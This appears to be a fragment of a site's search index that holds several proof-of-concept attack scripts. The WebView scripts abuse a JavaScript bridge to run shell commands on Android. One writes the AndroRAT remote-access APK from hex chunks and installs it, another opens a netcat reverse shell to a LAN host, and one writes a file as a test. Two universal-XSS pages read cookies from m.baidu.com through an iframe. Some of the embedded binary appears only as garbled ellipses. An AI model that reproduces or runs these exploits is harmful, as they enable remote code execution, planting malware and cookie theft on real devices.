objPDFCheckInterval; var objPDFCheckIntervalCounter = 0; // This function is called from JavaScript via setTimeout. function pdfLoaded() { objPDFCheckIntervalCounter++; var objPDF = document.getElementById('myObject'); if(isPDFLoaded===1){ clearTimeout(objPDFCheckInterval); javaScriptLogData("PDF object has been loaded successfuly."); callTheObj(); }else if(objPDFCheckIntervalCounter]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fwebviewpoc%2Fguama.js</url>
    <content type="text"><![CDATA[function execute(cmdArgs) { return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4 var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94 var armBinary3=â€¦ var armBinary4=â€¦ â€¦â€¦ var patharm = "/mnt/sdcard/Androrat.apk"; var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]); //alert(a); execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary3+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]); execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]); alert("over !!!");]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
    <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fuxss%2Fpoc1.html</url>
    <content type="text"><![CDATA[frame = document.body.appendChild(document.createElement("iframe")); frame.src = "http://m.baidu.com/"; frame.onload = function() { Function("}, (builtins = this), function() {"); originalInstantiate = builtins.Instantiate; builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {}); flag = 0; template = null; builtins.Instantiate = function(x, y) { if (flag) { doc = frame.contentWindow.document; alert(doc.cookie); flag = 0; } else if (!template) template = x; return originalInstantiate(x, y); }; document.implementation; flag = 1; builtins.ConfigureTemplateInstance(frame.contentWindow, template); } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fwebviewpoc%2Fshell.js</url>
    <content type="text"><![CDATA[function execute(cmdArgs) { return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]); alert("ok3");]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fwebviewpoc%2Fwrite.js</url>
    <content type="text"><![CDATA[function execute(cmdArgs) { return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } try{ execute(["/system/bin/sh","-c","echo 'Hello world' > /sdcard/goot.txt"]); }catch(e){ alert(e); }]]></content>
  </entry>
</search>
